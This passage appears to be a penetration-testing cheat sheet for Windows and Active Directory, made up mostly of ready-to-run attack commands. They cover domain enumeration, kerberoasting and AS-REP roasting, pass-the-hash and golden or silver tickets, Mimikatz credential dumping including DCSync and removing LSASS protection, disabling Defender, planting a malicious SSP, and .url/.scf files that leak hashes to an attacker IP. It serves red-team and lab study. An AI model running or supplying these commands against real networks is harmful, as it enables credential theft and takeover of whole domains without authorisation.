netstat -lntp
```

### List all SUID files

```
find / -perm -4000 2>/dev/null
```

### Determine the current version of Linux

```
 cat /etc/issue
```

### Determine more information about the environment

```
uname -a
```

### List processes running

```
ps -faux
```

### List the allowed (and forbidden) commands for the invoking use

```
sudo -l
```

------

## USEFUL WINDOWS COMMANDS
https://wadcoms.github.io/ - Interactive cheatsheet - Windows/ Active directory

```
net config Workstation
systeminfo
net users

ipconfig /all
netstat -ano

schtasks /query /fo LIST /v
tasklist /SVC
net start
DRIVERQUERY

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

dir /s pass == cred == vnc == .config
findstr /si password *.xml *.ini *.txt
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Disable windows defender
sc stop WinDefend

# Bypass restriction
powershell -nop -ep bypass

# List hidden files
dir /a

# Find a file
dir /b/s "<FILE>"
```

## Lateral Movement 

### Powerview
```
# Find existing local admin access for user (noisy 🚩)
Find-LocalAdminAccess

# Hunt for sessions of interesting users on machines where you have access (also noisy 🚩)
Find-DomainUserLocation -CheckAccess | ?{$_.LocalAdmin -Eq True }

# Look for kerberoastable users
Get-DomainUser -SPN | select name,serviceprincipalname

# Look for AS-REP roastable users
Get-DomainUser -PreauthNotRequired | select name

# Look for interesting ACL within the domain, filtering on a specific user or group you have compromised
## Exploitation depends on the identified ACL, some techniques are discussed in this cheat sheet
## Example for GenericWrite on user: Disable preauth or add SPN for targeted kerberoast (see below)
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "UserOrGroupToQuery"}

# Look for servers with Unconstrained Delegation enabled
## If available and you have admin privs on this server, get user TGT (see below)
Get-DomainComputer -Unconstrained

# Look for users or computers with Constrained Delegation enabled
## If available and you have user/computer hash, access service machine as DA (see below)
Get-DomainUser -TrustedToAuth | select userprincipalname,msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto
```

### Bloodhound 
```
# Run all checks, including restricted groups enforced through the domain  🚩
Invoke-BloodHound -CollectionMethod All,GPOLocalGroup

# Running LoggedOn separately sometimes gives you more sessions, but enumerates by looping through hosts so is VERY noisy 🚩
Invoke-BloodHound -CollectionMethod LoggedOn
```
------
## Kerberoasting 
### Automatic 
```
# With PowerView
Get-DomainSPNTicket -SPN "MSSQLSvc/sqlserver.targetdomain.com"

# Crack the hash with Hashcat:

hashcat -a 0 -m 13100 hash.txt `pwd`/rockyou.txt --rules-file `pwd`/hashcat/rules/best64.rule
```

### Manual 

```
# Request TGS for kerberoastable account (SPN)
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sqlserver.targetdomain.com"

# Dump TGS to disk
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Crack with TGSRepCrack
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\mssqlsvc.kirbi
```

### Targeted kerberoasting by setting SPN
```
# We need have ACL write permissions to set UserAccountControl flags for the target user, see above for identification of interesting ACLs. Using PowerView:

Set-DomainObject -Identity TargetUser -Set @{serviceprincipalname='any/thing'}
```

-----
## AS-REP roasting

```
# Get the hash for a roastable user (see above for hunting). Using ASREPRoast.ps1:
Get-ASREPHash -UserName TargetUser
# Crack the hash with Hashcat:

hashcat -a 0 -m 18200 hash.txt `pwd`/rockyou.txt --rules-file `pwd`/hashcat/rules/best64.rule
```

### Targeted AS-REP roasting by disabling Kerberos pre-authentication
```
# Again, we need ACL write permissions to set UserAccountControl flags for the target user. Using PowerView:

Set-DomainObject -Identity TargetUser -XOR @{useraccountcontrol=4194304}
```
-----
## Token Manipulation
Tokens can be impersonated from other users with a session/running processes on the machine. Most C2 frameworks have functionality for this built-in (such as the ‘Steal Token’ functionality in Cobalt Strike).

### Incognito
```
# Show tokens on the machine
.\incognito.exe list_tokens -u

# Start new process with token of a specific user
.\incognito.exe execute -c "domain\user" C:\Windows\system32\calc.exe
```

### Invoke-TokenManipulation
```
# Show all tokens on the machine
Invoke-TokenManipulation -ShowAll

# Show only unique, usable tokens on the machine
Invoke-TokenManipulation -Enumerate

# Start new process with token of a specific user
Invoke-TokenManipulation -ImpersonateUser -Username "domain\user"

# Start new process with token of another process
Invoke-TokenManipulation -CreateProcess "C:\Windows\system32\calc.exe" -ProcessId 500
```

-----
### Lateral Movement with Rubeus

We can use Rubeus to execute a technique called “Overpass-the-Hash”. In this technique, instead of passing the hash directly (another technique known as Pass-the-Hash), we use the NTLM hash of an account to request a valid Kerberost ticket (TGT). We can then use this ticket to authenticate towards the domain as the target user.

```
# Request a TGT as the target user and pass it into the current session
# NOTE: Make sure to clear tickets in the current session (with 'klist purge') to ensure you don't have multiple active TGTs
.\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /ptt

# More stealthy variant, but requires the AES256 key (see 'Dumping OS credentials with Mimikatz' section)
.\Rubeus.exe asktgt /user:Administrator /aes256:[AES256KEY] /opsec /ptt

# Pass the ticket to a sacrificial hidden process, allowing you to e.g. steal the token from this process (requires elevation)
.\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /createnetonly:C:\Windows\System32\cmd.exe
```
Once we have a TGT as the target user, we can use services as this user in a domain context, allowing us to move laterally.

***
### Lateral Movement with Mimikatz 

```
# Overpass-the-hash (more risky than Rubeus, writes to LSASS memory)
sekurlsa::pth /user:Administrator /domain:targetdomain.com /ntlm:[NTLMHASH] /run:powershell.exe

# Or, a more opsec-safe version that uses the AES256 key (similar to with Rubeus above) - works for multiple Mimikatz commands
sekurlsa::pth /user:Administrator /domain:targetdomain.com /aes256:[AES256KEY] /run:powershell.exe

# Golden ticket (domain admin, w/ some ticket properties to avoid detection)
kerberos::golden /user:Administrator /domain:targetdomain.com /sid:S-1-5-21-[DOMAINSID] /krbtgt:[KRBTGTHASH] /id:500 /groups:513,512,520,518,519 /startoffset:0 /endin:600 /renewmax:10080 /ptt

# Silver ticket for a specific SPN with a compromised service / machine account
kerberos::golden /user:Administrator /domain:targetdomain.com /sid:S-1-5-21-[DOMAINSID] /rc4:[MACHINEACCOUNTHASH] /target:dc.targetdomain.com /service:HOST /id:500 /groups:513,512,520,518,519 /startoffset:0 /endin:600 /renewmax:10080 /ptt
```

## Tools

- [Powersploit](https://github.com/PowerShellMafia/PowerSploit/tree/dev)
- [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)
- [Powermad](https://github.com/Kevin-Robertson/Powermad)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [Rubeus](https://github.com/GhostPack/Rubeus) -> [Compiled Version](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)
- [BloodHound](https://github.com/BloodHoundAD/BloodHound)
- [AD Module](https://github.com/samratashok/ADModule)
- [ASREPRoast](https://github.com/HarmJ0y/ASREPRoast)
- [Adalanche](https://github.com/lkarlslund/adalanche)

## Domain Enumeration

### Using PowerView

[Powerview v.3.0](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)<br>
[Powerview Wiki](https://powersploit.readthedocs.io/en/latest/)

- **Get Current Domain:** `Get-Domain`
- **Enumerate Other Domains:** `Get-Domain -Domain <DomainName>`
- **Get Domain SID:** `Get-DomainSID`
- **Get Domain Policy:**

  ```powershell
  Get-DomainPolicy

  #Will show us the policy configurations of the Domain about system access or kerberos
  Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess
  Get-DomainPolicy | Select-Object -ExpandProperty KerberosPolicy
  ```

- **Get Domain Controllers:**
  ```powershell
  Get-DomainController
  Get-DomainController -Domain <DomainName>
  ```
- **Enumerate Domain Users:**

  ```powershell
  #Save all Domain Users to a file
  Get-DomainUser | Out-File -FilePath .\DomainUsers.txt

  #Will return specific properties of a specific user
  Get-DomainUser -Identity [username] -Properties DisplayName, MemberOf | Format-List

  #Enumerate user logged on a machine
  Get-NetLoggedon -ComputerName <ComputerName>

  #Enumerate Session Information for a machine
  Get-NetSession -ComputerName <ComputerName>

  #Enumerate domain machines of the current/specified domain where specific users are logged into
  Find-DomainUserLocation -Domain <DomainName> | Select-Object UserName, SessionFromName
  ```

- **Enum Domain Computers:**

  ```powershell
  Get-DomainComputer -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName

  #Enumerate Live machines
  Get-DomainComputer -Ping -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName
  ```

- **Enum Groups and Group Members:**

  ```powershell
  #Save all Domain Groups to a file:
  Get-DomainGroup | Out-File -FilePath .\DomainGroup.txt

  #Return members of Specific Group (eg. Domain Admins & Enterprise Admins)
  Get-DomainGroup -Identity '<GroupName>' | Select-Object -ExpandProperty Member
  Get-DomainGroupMember -Identity '<GroupName>' | Select-Object MemberDistinguishedName

  #Enumerate the local groups on the local (or remote) machine. Requires local admin rights on the remote machine
  Get-NetLocalGroup | Select-Object GroupName

  #Enumerates members of a specific local group on the local (or remote) machine. Also requires local admin rights on the remote machine
  Get-NetLocalGroupMember -GroupName Administrators | Select-Object MemberName, IsGroup, IsDomain

  #Return all GPOs in a domain that modify local group memberships through Restricted Groups or Group Policy Preferences
  Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName
  ```

- **Enumerate Shares:**

  ```powershell
  #Enumerate Domain Shares
  Find-DomainShare

  #Enumerate Domain Shares the current user has access
  Find-DomainShare -CheckShareAccess

  #Enumerate "Interesting" Files on accessible shares
  Find-InterestingDomainShareFile -Include *passwords*
  ```

- **Enum Group Policies:**

  ```powershell
  Get-DomainGPO -Properties DisplayName | Sort-Object -Property DisplayName

  #Enumerate all GPOs to a specific computer
  Get-DomainGPO -ComputerIdentity <ComputerName> -Properties DisplayName | Sort-Object -Property DisplayName

  #Get users that are part of a Machine's local Admin group
  Get-DomainGPOComputerLocalGroupMapping -ComputerName <ComputerName>
  ```

- **Enum OUs:**
  ```powershell
  Get-DomainOU -Properties Name | Sort-Object -Property Name
  ```
- **Enum ACLs:**

  ```powershell
  # Returns the ACLs associated with the specified account
  Get-DomaiObjectAcl -Identity <AccountName> -ResolveGUIDs

  #Search for interesting ACEs
  Find-InterestingDomainAcl -ResolveGUIDs

  #Check the ACLs associated with a specified path (e.g smb share)
  Get-PathAcl -Path "\\Path\Of\A\Share"
  ```

- **Enum Domain Trust:**

  ```powershell
  Get-DomainTrust
  Get-DomainTrust -Domain <DomainName>

  #Enumerate all trusts for the current domain and then enumerates all trusts for each domain it finds
  Get-DomainTrustMapping
  ```

- **Enum Forest Trust:**

  ```powershell
  Get-ForestDomain
  Get-ForestDomain -Forest <ForestName>

  #Map the Trust of the Forest
  Get-ForestTrust
  Get-ForestTrust -Forest <ForestName>
  ```

- **User Hunting:**

  ```powershell
  #Finds all machines on the current domain where the current user has local admin access
  Find-LocalAdminAccess -Verbose

  #Find local admins on all machines of the domain
  Find-DomainLocalGroupMember -Verbose

  #Find computers were a Domain Admin OR a spesified user has a session
  Find-DomainUserLocation | Select-Object UserName, SessionFromName

  #Confirming admin access
  Test-AdminAccess
  ```

  :heavy_exclamation_mark: **Priv Esc to Domain Admin with User Hunting:** \
  I have local admin access on a machine -> A Domain Admin has a session on that machine -> I steal his token and impersonate him -> Profit!

### Using AD Module

- **Get Current Domain:** `Get-ADDomain`
- **Enum Other Domains:** `Get-ADDomain -Identity <Domain>`
- **Get Domain SID:** `Get-DomainSID`
- **Get Domain Controlers:**

  ```powershell
  Get-ADDomainController
  Get-ADDomainController -Identity <DomainName>
  ```

- **Enumerate Domain Users:**

  ```powershell
  Get-ADUser -Filter * -Identity <user> -Properties *

  #Get a spesific "string" on a user's attribute
  Get-ADUser -Filter 'Description -like "*wtver*"' -Properties Description | select Name, Description
  ```

- **Enum Domain Computers:**
  ```powershell
  Get-ADComputer -Filter * -Properties *
  Get-ADGroup -Filter *
  ```
- **Enum Domain Trust:**
  ```powershell
  Get-ADTrust -Filter *
  Get-ADTrust -Identity <DomainName>
  ```
- **Enum Forest Trust:**

  ```powershell
  Get-ADForest
  Get-ADForest -Identity <ForestName>

  #Domains of Forest Enumeration
  (Get-ADForest).Domains
  ```

- **Enum Local AppLocker Effective Policy:**

  ```powershell
  Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
  ```

### Using BloodHound

#### Remote BloodHound

[Python BloodHound Repository](https://github.com/fox-it/BloodHound.py) or install it with `pip3 install bloodhound`

```powershell
bloodhound-python -u <UserName> -p <Password> -ns <Domain Controller's Ip> -d <Domain> -c All
```

#### On Site BloodHound

```powershell
#Using exe ingestor
.\SharpHound.exe --CollectionMethod All --LdapUsername <UserName> --LdapPassword <Password> --domain <Domain> --domaincontroller <Domain Controller's Ip> --OutputDirectory <PathToFile>

#Using PowerShell module ingestor
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All --LdapUsername <UserName> --LdapPassword <Password> --OutputDirectory <PathToFile>
```

### Using Adalanche

#### Remote Adalanche

```bash
# kali linux:
./adalanche collect activedirectory --domain <Domain> \
--username <Username@Domain> --password <Password> \
--server <DC>

# Example:
./adalanche collect activedirectory --domain windcorp.local \
--username spoNge369@windcorp.local --password 'password123!' \
--server dc.windcorp.htb
## -> Terminating successfully

## Any error?:

# LDAP Result Code 200 "Network Error": x509: certificate signed by unknown authority ?

./adalanche collect activedirectory --domain windcorp.local \
--username spoNge369@windcorp.local --password 'password123!' \
--server dc.windcorp.htb --tlsmode NoTLS --port 389

# Invalid Credentials ?
./adalanche collect activedirectory --domain windcorp.local \
--username spoNge369@windcorp.local --password 'password123!' \
--server dc.windcorp.htb --tlsmode NoTLS --port 389 \
--authmode basic

# Analyze data 
# go to web browser -> 127.0.0.1:8080
./adalanche analyze
```

### Useful Enumeration Tools

- [ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump) Information dumper via LDAP
- [adidnsdump](https://github.com/dirkjanm/adidnsdump) Integrated DNS dumping by any authenticated user
- [ACLight](https://github.com/cyberark/ACLight) Advanced Discovery of Privileged Accounts
- [ADRecon](https://github.com/sense-of-security/ADRecon) Detailed Active Directory Recon Tool

## Local Privilege Escalation

- [Windows Privilege Escalation CheatSheet](https://github.com/nickvourd/Windows_Privilege_Escalation_CheatSheet) Cheat Sheet for Windows Local Privilege Escalations

- [Juicy Potato](https://github.com/ohpe/juicy-potato) Abuse SeImpersonate or SeAssignPrimaryToken Privileges for System Impersonation

  :warning: Works only until Windows Server 2016 and Windows 10 until patch 1803

- [Lovely Potato](https://github.com/TsukiCTF/Lovely-Potato) Automated Juicy Potato

  :warning: Works only until Windows Server 2016 and Windows 10 until patch 1803

- [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) Exploit the PrinterBug for System Impersonation

  :pray: Works for Windows Server 2019 and Windows 10

- [RoguePotato](https://github.com/antonioCoco/RoguePotato) Upgraded Juicy Potato

  :pray: Works for Windows Server 2019 and Windows 10

- [Abusing Token Privileges](https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/)
- [SMBGhost CVE-2020-0796](https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/) \
  [PoC](https://github.com/danigargu/CVE-2020-0796)
- [CVE-2021-36934 (HiveNightmare/SeriousSAM)](https://github.com/cube0x0/CVE-2021-36934)

### Useful Local Priv Esc Tools

- [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1) Misconfiguration Abuse
- [BeRoot](https://github.com/AlessandroZ/BeRoot) General Priv Esc Enumeration Tool
- [Privesc](https://github.com/enjoiz/Privesc) General Priv Esc Enumeration Tool
- [FullPowers](https://github.com/itm4n/FullPowers) Restore A Service Account's Privileges

## Lateral Movement

### PowerShell Remoting

```powershell
#Enable PowerShell Remoting on current Machine (Needs Admin Access)
Enable-PSRemoting

#Entering or Starting a new PSSession (Needs Admin Access)
$sess = New-PSSession -ComputerName <Name>
Enter-PSSession -ComputerName <Name> OR -Sessions <SessionName>
```

### Remote Code Execution with PS Credentials

```powershell
$SecPassword = ConvertTo-SecureString '<Wtver>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\<WtverUser>', $SecPassword)
Invoke-Command -ComputerName <WtverMachine> -Credential $Cred -ScriptBlock {whoami}
```

### Import a PowerShell Module and Execute its Functions Remotely

```powershell
#Execute the command and start a session
Invoke-Command -Credential $cred -ComputerName <NameOfComputer> -FilePath c:\FilePath\file.ps1 -Session $sess

#Interact with the session
Enter-PSSession -Session $sess

```

### Executing Remote Stateful commands

```powershell
#Create a new session
$sess = New-PSSession -ComputerName <NameOfComputer>

#Execute command on the session
Invoke-Command -Session $sess -ScriptBlock {$ps = Get-Process}

#Check the result of the command to confirm we have an interactive session
Invoke-Command -Session $sess -ScriptBlock {$ps}
```

### Mimikatz

```powershell
#The commands are in cobalt strike format!

#Dump LSASS:
mimikatz privilege::debug
mimikatz token::elevate
mimikatz sekurlsa::logonpasswords

#(Over) Pass The Hash
mimikatz privilege::debug
mimikatz sekurlsa::pth /user:<UserName> /ntlm:<> /domain:<DomainFQDN>

#List all available kerberos tickets in memory
mimikatz sekurlsa::tickets

#Dump local Terminal Services credentials
mimikatz sekurlsa::tspkg

#Dump and save LSASS in a file
mimikatz sekurlsa::minidump c:\temp\lsass.dmp

#List cached MasterKeys
mimikatz sekurlsa::dpapi

#List local Kerberos AES Keys
mimikatz sekurlsa::ekeys

#Dump SAM Database
mimikatz lsadump::sam

#Dump SECRETS Database
mimikatz lsadump::secrets

#Inject and dump the Domain Controler's Credentials
mimikatz privilege::debug
mimikatz token::elevate
mimikatz lsadump::lsa /inject

#Dump the Domain's Credentials without touching DC's LSASS and also remotely
mimikatz lsadump::dcsync /domain:<DomainFQDN> /all

#List and Dump local kerberos credentials
mimikatz kerberos::list /dump

#Pass The Ticket
mimikatz kerberos::ptt <PathToKirbiFile>

#List TS/RDP sessions
mimikatz ts::sessions

#List Vault credentials
mimikatz vault::list
```

:exclamation: What if mimikatz fails to dump credentials because of LSA Protection controls ?

- LSA as a Protected Process (Kernel Land Bypass)

  ```powershell
  #Check if LSA runs as a protected process by looking if the variable "RunAsPPL" is set to 0x1
  reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa

  #Next upload the mimidriver.sys from the official mimikatz repo to same folder of your mimikatz.exe
  #Now lets import the mimidriver.sys to the system
  mimikatz # !+

  #Now lets remove the protection flags from lsass.exe process
  mimikatz # !processprotect /process:lsass.exe /remove

  #Finally run the logonpasswords function to dump lsass
  mimikatz # sekurlsa::logonpasswords
  ```

- LSA as a Protected Process (Userland "Fileless" Bypass)

  - [PPLdump](https://github.com/itm4n/PPLdump)
  - [Bypassing LSA Protection in Userland](https://blog.scrt.ch/2021/04/22/bypassing-lsa-protection-in-userland)

- LSA is running as virtualized process (LSAISO) by Credential Guard

  ```powershell
  #Check if a process called lsaiso.exe exists on the running processes
  tasklist |findstr lsaiso

  #If it does there isn't a way tou dump lsass, we will only get encrypted data. But we can still use keyloggers or clipboard dumpers to capture data.
  #Lets inject our own malicious Security Support Provider into memory, for this example i'll use the one mimikatz provides
  mimikatz # misc::memssp

  #Now every user session and authentication into this machine will get logged and plaintext credentials will get captured and dumped into c:\windows\system32\mimilsa.log
  ```

- [Detailed Mimikatz Guide](https://adsecurity.org/?page_id=1821)
- [Poking Around With 2 lsass Protection Options](https://medium.com/red-teaming-with-a-blue-team-mentaility/poking-around-with-2-lsass-protection-options-880590a72b1a)

### Remote Desktop Protocol

If the host we want to lateral move to has "RestrictedAdmin" enabled, we can pass the hash using the RDP protocol and get an interactive session without the plaintext password.

- Mimikatz:

  ```powershell
  #We execute pass-the-hash using mimikatz and spawn an instance of mstsc.exe with the "/restrictedadmin" flag
  privilege::debug
  sekurlsa::pth /user:<Username> /domain:<DomainName> /ntlm:<NTLMHash> /run:"mstsc.exe /restrictedadmin"

  #Then just click ok on the RDP dialogue and enjoy an interactive session as the user we impersonated
  ```

- xFreeRDP:

```powershell
xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore /bpp:8  /u:<Username> /pth:<NTLMHash> /v:<Hostname | IPAddress>
```

:exclamation: If Restricted Admin mode is disabled on the remote machine we can connect on the host using another tool/protocol like psexec or winrm and enable it by creating the following registry key and setting it's value zero: "HKLM:\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin".

### URL File Attacks

- .url file

  ```
  [InternetShortcut]
  URL=whatever
  WorkingDirectory=whatever
  IconFile=\\<AttackersIp>\%USERNAME%.icon
  IconIndex=1
  ```

  ```
  [InternetShortcut]
  URL=file://<AttackersIp>/leak/leak.html
  ```

- .scf file

  ```
  [Shell]
  Command=2
  IconFile=\\<AttackersIp>\Share\test.ico
  [Taskbar]
  Command=ToggleDesktop
  ```

Putting these files in a writeable share the victim only has to open the file explorer and navigate to the share. **Note** that the file doesn't need to be opened or the user to interact with it, but it must be on the top of the file system or just visible in the windows explorer window in order to be rendered. Use responder to capture the hashes.

:exclamation: .scf file attacks won't work on the latest versions of Windows.

### Useful Tools

- [Powercat](https://github.com/besimorhino/powercat) netcat written in powershell, and provides tunneling, relay and portforward
  capabilities.
- [SCShell](https://github.com/Mr-Un1k0d3r/SCShell) fileless lateral movement tool that relies on ChangeServiceConfigA to run command
- [Evil-Winrm](https://github.com/Hackplayers/evil-winrm) the ultimate WinRM shell for hacking/pentesting
- [RunasCs](https://github.com/antonioCoco/RunasCs) Csharp and open version of windows builtin runas.exe
- [ntlm_theft](https://github.com/Greenwolf/ntlm_theft.git) creates all possible file formats for url file attacks

## Domain Privilege Escalation

### Kerberoast

_WUT IS DIS?:_ \
 All standard domain users can request a copy of all service accounts along with their correlating password hashes, so we can ask a TGS for any SPN that is bound to a "user"  
 account, extract the encrypted blob that was encrypted using the user's password and bruteforce it offline.

- PowerView:

  ```powershell
  #Get User Accounts that are used as Service Accounts
  Get-NetUser -SPN

  #Get every available SPN account, request a TGS and dump its hash
  Invoke-Kerberoast

  #Requesting the TGS for a single account:
  Request-SPNTicket

  #Export all tickets using Mimikatz
  Invoke-Mimikatz -Command '"kerberos::list /export"'
  ```

- AD Module:

  ```powershell
  #Get User Accounts that are used as Service Accounts
  Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
  ```

- Impacket:

  ```powershell
  python GetUserSPNs.py <DomainName>/<DomainUser>:<Password> -outputfile <FileName>
  ```

- Rubeus:

  ```powershell
  #Kerberoasting and outputing on a file with a spesific format
  Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName>

  #Kerberoasting whle being "OPSEC" safe, essentially while not try to roast AES enabled accounts
  Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /rc4opsec

  #Kerberoast AES enabled accounts
  Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /aes

  #Kerberoast spesific user account
  Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /user:<username> /simple

  #Kerberoast by specifying the authentication credentials
  Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /creduser:<username> /credpassword:<password>
  ```

### ASREPRoast

_WUT IS DIS?:_ \
 If a domain user account do not require kerberos preauthentication, we can request a valid TGT for this account without even having domain credentials, extract the encrypted  
 blob and bruteforce it offline.

- PowerView: `Get-DomainUser -PreauthNotRequired -Verbose`
- AD Module: `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth`

Forcefully Disable Kerberos Preauth on an account i have Write Permissions or more!
Check for interesting permissions on accounts:

**Hint:** We add a filter e.g. RDPUsers to get "User Accounts" not Machine Accounts, because Machine Account hashes are not crackable!

PowerView:

```powershell
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}
Disable Kerberos Preauth:
Set-DomainObject -Identity <UserAccount> -XOR @{useraccountcontrol=4194304} -Verbose
Check if the value changed:
Get-DomainUser -PreauthNotRequired -Verbose
```

- And finally execute the attack using the [ASREPRoast](https://github.com/HarmJ0y/ASREPRoast) tool.

  ```powershell
  #Get a spesific Accounts hash:
  Get-ASREPHash -UserName <UserName> -Verbose

  #Get any ASREPRoastable Users hashes:
  Invoke-ASREPRoast -Verbose
  ```

- Using Rubeus:

  ```powershell
  #Trying the attack for all domain users
  Rubeus.exe asreproast /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>

  #ASREPRoast spesific user
  Rubeus.exe asreproast /user:<username> /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>

  #ASREPRoast users of a spesific OU (Organization Unit)
  Rubeus.exe asreproast /ou:<OUName> /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>
  ```

- Using Impacket:

  ```powershell
  #Trying the attack for the specified users on the file
  python GetNPUsers.py <domain_name>/ -usersfile <users_file> -outputfile <FileName>
  ```

### Password Spray Attack

If we have harvest some passwords by compromising a user account, we can use this method to try and exploit password reuse
on other domain accounts.

**Tools:**

- [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
- [Invoke-CleverSpray](https://github.com/wavestone-cdt/Invoke-CleverSpray)
- [Spray](https://github.com/Greenwolf/Spray)

### Force Set SPN

_WUT IS DIS ?:
If we have enough permissions -> GenericAll/GenericWrite we can set a SPN on a target account, request a TGS, then grab its blob and bruteforce it._

- PowerView:

  ```powershell
  #Check for interesting permissions on accounts:
  Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}

  #Check if current user has already an SPN setted:
  Get-DomainUser -Identity <UserName> | select serviceprincipalname

  #Force set the SPN on the account:
  Set-DomainObject <UserName> -Set @{serviceprincipalname='ops/whatever1'}
  ```

- AD Module:

  ```powershell
  #Check if current user has already an SPN setted
  Get-ADUser -Identity <UserName> -Properties ServicePrincipalName | select ServicePrincipalName

  #Force set the SPN on the account:
  Set-ADUser -Identiny <UserName> -ServicePrincipalNames @{Add='ops/whatever1'}
  ```

Finally use any tool from before to grab the hash and kerberoast it!

### Abusing Shadow Copies

If you have local administrator access on a machine try to list shadow copies, it's an easy way for Domain Escalation.

```powershell
#List shadow copies using vssadmin (Needs Admnistrator Access)
vssadmin list shadows

#List shadow copies using diskshadow
diskshadow list shadows all

#Make a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

1. You can dump the backuped SAM database and harvest credentials.
2. Look for DPAPI stored creds and decrypt them.
3. Access backuped sensitive files.

### List and Decrypt Stored Credentials using Mimikatz

Usually encrypted credentials are stored in:

- `%appdata%\Microsoft\Credentials`
- `%localappdata%\Microsoft\Credentials`

```powershell
#By using the cred function of mimikatz we can enumerate the cred object and get information about it:
dpapi::cred /in:"%appdata%\Microsoft\Credentials\<CredHash>"

#From the previous command we are interested to the "guidMasterKey" parameter, that tells us which masterkey was used to encrypt the credential
#Lets enumerate the Master Key:
dpapi::masterkey /in:"%appdata%\Microsoft\Protect\<usersid>\<MasterKeyGUID>"

#Now if we are on the context of the user (or system) that the credential belogs to, we can use the /rpc flag to pass the decryption of the masterkey to the domain controler:
dpapi::masterkey /in:"%appdata%\Microsoft\Protect\<usersid>\<MasterKeyGUID>" /rpc

#We now have the masterkey in our local cache:
dpapi::cache

#Finally we can decrypt the credential using the cached masterkey:
dpapi::cred /in:"%appdata%\Microsoft\Credentials\<CredHash>"
```

Detailed Article:
[DPAPI all the things](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials)

### Unconstrained Delegation

_WUT IS DIS ?: If we have Administrative access on a machine that has Unconstrained Delegation enabled, we can wait for a
high value target or DA to connect to it, steal his TGT then ptt and impersonate him!_

Using PowerView:

```powershell
#Discover domain joined computers that have Unconstrained Delegation enabled
Get-NetComputer -UnConstrained

#List tickets and check if a DA or some High Value target has stored its TGT
Invoke-Mimikatz -Command '"sekurlsa::tickets"'

#Command to monitor any incoming sessions on our compromised server
Invoke-UserHunter -ComputerName <NameOfTheComputer> -Poll <TimeOfMonitoringInSeconds> -UserName <UserToMonitorFor> -Delay
<WaitInterval> -Verbose

#Dump the tickets to disk:
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

#Impersonate the user using ptt attack:
Invoke-Mimikatz -Command '"kerberos::ptt <PathToTicket>"'
```

**Note:** We can also use Rubeus!

### Constrained Delegation

Using PowerView and Kekeo:

```powershell
#Enumerate Users and Computers with constrained delegation
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

#If we have a user that has Constrained delegation, we ask for a valid tgt of this user using kekeo
tgt::ask /user:<UserName> /domain:<Domain's FQDN> /rc4:<hashedPasswordOfTheUser>

#Then using the TGT we have ask a TGS for a Service this user has Access to through constrained delegation
tgs::s4u /tgt:<PathToTGT> /user:<UserToImpersonate>@<Domain's FQDN> /service:<Service's SPN>

#Finally use mimikatz to ptt the TGS
Invoke-Mimikatz -Command '"kerberos::ptt <PathToTGS>"'
```

_ALTERNATIVE:_
Using Rubeus:

```powershell
Rubeus.exe s4u /user:<UserName> /rc4:<NTLMhashedPasswordOfTheUser> /impersonateuser:<UserToImpersonate> /msdsspn:"<Service's SPN>" /altservice:<Optional> /ptt
```

Now we can access the service as the impersonated user!

:triangular_flag_on_post: **What if we have delegation rights for only a spesific SPN? (e.g TIME):**

In this case we can still abuse a feature of kerberos called "alternative service". This allows us to request TGS tickets for other "alternative" services and not only for the one we have rights for. Thats gives us the leverage to request valid tickets for any service we want that the host supports, giving us full access over the target machine.

### Resource Based Constrained Delegation

